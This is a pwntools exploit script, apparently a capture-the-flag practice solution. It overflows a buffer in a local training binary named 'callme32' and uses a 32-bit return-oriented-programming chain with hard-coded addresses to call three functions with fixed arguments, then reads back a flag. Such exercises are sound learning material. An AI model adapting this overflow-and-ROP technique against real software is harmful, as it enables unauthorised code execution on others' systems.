from pwn import *


callme_one_plt = pack(0x080484f0, 32)
callme_two_plt = pack(0x08048550, 32)
callme_three_plt = pack(0x080484e0, 32)

exit_plt = pack(0x08048510, 32)

arg1 = pack(0xdeadbeef, 32)
arg2 = pack(0xcafebabe, 32)
arg3 = pack(0xd00df00d, 32)

# 0x080484ad : pop ebx ; ret
# remove_arg_gadget = pack(0x080484ad, 32)

# 0x080484aa : add esp, 8 ; pop ebx ; ret
remove_args_gadget = pack(0x080484aa, 32)

payload = b""
payload += b"A"*(54-8-2)

payload += callme_one_plt
payload += remove_args_gadget # ret
payload += arg1
payload += arg2
payload += arg3

payload += callme_two_plt # ret
payload += remove_args_gadget
payload += arg1
payload += arg2
payload += arg3

payload += callme_three_plt # ret
payload += remove_args_gadget
payload += arg1
payload += arg2
payload += arg3

payload += exit_plt # ret

write("/tmp/docgil", payload)

p = process(["callme32"])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall().decode("utf-8")
log.info(f"flag: {flag}")